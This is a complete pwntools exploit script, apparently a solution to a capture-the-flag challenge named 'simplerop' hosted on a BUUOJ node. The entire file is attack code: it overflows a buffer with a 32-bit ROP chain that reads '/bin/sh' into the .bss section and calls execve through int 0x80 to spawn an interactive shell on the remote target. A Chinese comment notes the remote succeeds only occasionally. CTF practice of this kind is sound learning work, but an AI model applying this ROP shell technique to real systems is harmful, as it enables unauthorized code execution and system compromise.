#Made by fly_autumn
#x86 static
from pwn import *
#p = process("./simplerop")
p = remote("node5.buuoj.cn.26969")#这个远程环境估计有点什么毛病，连十几次成功一次能用shell
elf = ELF("./simplerop")
context(os="linux",arch="i386")

read_plt = 0x806cd50
offset = 32
main_addr = elf.sym["main"]
bss_addr = elf.bss()
pop_eax = 0x80bae06
pop_edx_ecx_ebx = 0x806e850
int_0x80 = 0x80493e1

payload = b"\x00" * offset + p32(read_plt) + p32(pop_edx_ecx_ebx) + p32(0) + p32(bss_addr) + p32(8) + p32(pop_eax) + p32(11) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss_addr) + p32(int_0x80)
p.recvuntil(b"input :")
p.sendline(payload)
p.send(b"/bin/sh\x00")


p.interactive()
